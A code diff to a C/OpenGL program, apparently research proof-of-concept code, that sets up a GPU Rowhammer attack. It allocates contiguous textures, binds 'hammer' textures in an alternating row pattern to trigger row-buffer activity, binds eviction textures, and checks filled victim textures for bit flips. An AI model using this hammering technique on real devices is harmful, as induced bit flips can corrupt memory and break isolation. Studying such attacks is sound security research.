@@ -150,19 +150,24 @@ void view_framebuffer() {
   printf("\n");
 }
 
+void bind_texture(unsigned int textureId, int i, char type, int offset) {
+  char temp[20];
+  sprintf(temp, "%cTex0%d", type, i);
+  printf("++ Binding [%s] %d=[%d] -- offset: %d\n", temp, textureId, textureId%256, offset);
+
+  GLuint uUniform = glGetUniformLocation(shader.ID, temp);
+  glActiveTexture(GL_TEXTURE0 + i);
+  glBindTexture(GL_TEXTURE_2D, textureId);
+  glUniform1i(uUniform, i);
+}
+
 void bind_hammer_textures() {
   KGSLEntry cont_entries[48];
   allocate_cont(48, KB4, &cont_entries[0]);
   print_entries(cont_entries, 0, 8);
 
   for (int i = 0; i < 10; i ++ ) {
-    char temp[20];
-    sprintf(temp, "HTex0%d", i);
-    printf("++ Binding [%s] [%d]\n", temp, cont_entries[i].texture_id%256);
-    GLuint uUniform = glGetUniformLocation(shader.ID, temp);
-    glActiveTexture(GL_TEXTURE0 + i);
-    glBindTexture(GL_TEXTURE_2D, cont_entries[i].texture_id);
-    glUniform1i(uUniform, i);
+    bind_texture(cont_entries[i].texture_id, i, 'H', i);
   }
 
 }
@@ -192,20 +197,30 @@ void prepare_hammer_time() {
   fill_texture(cont_entries[offset + 16].texture_id, 0xFF);
   fill_texture(cont_entries[offset + 17].texture_id, 0xFF);
 
-  // TODO: pass hammer textures
+  // pass hammer textures according to hammer pattern: jump to differnet row to trigger row buffer when hammering
+  bind_texture(cont_entries[offset + 0].texture_id, 0, 'H', offset + 0);
+  bind_texture(cont_entries[offset + 32].texture_id, 1, 'H', offset + 32);
+  bind_texture(cont_entries[offset + 1].texture_id, 2, 'H', offset + 1);
+  bind_texture(cont_entries[offset + 33].texture_id, 3, 'H', offset + 33);
 
   // select 5 textures for eviction
   if (offset < 8) {
-    // take 5 textures from end of first row 
-    // TODO: 11,12,13,14,15
+    // take 5 textures from end of first row: 11,12,13,14,15
+    for(int i=0; i<5; i++) {
+      bind_texture(cont_entries[11+i].texture_id, 4+i, 'I', 11+i);
+    }
   } else {
-    // take 5 textures from beginning of first row
-    // TODO: 0,1,2,3,4
+    // take 5 textures from beginning of first row: 0,1,2,3,4
+    for(int i=0; i<5; i++) {
+      bind_texture(cont_entries[i].texture_id, 4+i, 'I', i);
+    }
   }
+  // important: bind dummy texture last to prevent last texture error
+  bind_texture(cont_entries[15].texture_id, 9, 'D', 15);
 
   // check hammered textures for bit flip
-  view_texture(cont_entries[offset + 16].texture_id);
-  view_texture(cont_entries[offset + 17].texture_id);
+  // view_texture(cont_entries[offset + 16].texture_id);
+  // view_texture(cont_entries[offset + 17].texture_id);
 }
 
 int main( int argc, char** argv ) {
@@ -215,18 +230,20 @@ int main( int argc, char** argv ) {
   init_opengl_setup();
   counters_init();
 
+  prepare_hammer_time();
+
   // Option1) debug shader output with framebuffer
-  // init_debug();
-  // glDrawElements(GL_TRIANGLES, 6, GL_UNSIGNED_INT, 0);
-  // view_framebuffer();
+  init_debug();
+  glDrawElements(GL_TRIANGLES, 6, GL_UNSIGNED_INT, 0);
+  view_framebuffer();
 
   // Option2) Execute 1 pixel
   // glDrawArrays(GL_POINTS, 0, 1);
 
-  GLuint group_UCHE[]   = {8, 9, 9};
-  GLuint counter_UCHE[] = {0, 1, 2};
-  GLuint num_target_counters = 3;
-  perform_measurement(group_UCHE, counter_UCHE, num_target_counters);
+  // GLuint group_UCHE[]   = {8, 9, 9};
+  // GLuint counter_UCHE[] = {0, 1, 2};
+  // GLuint num_target_counters = 3;
+  // perform_measurement(group_UCHE, counter_UCHE, num_target_counters);
 
   // init framebuffer to check for bit flips
   // init_framebuffer();
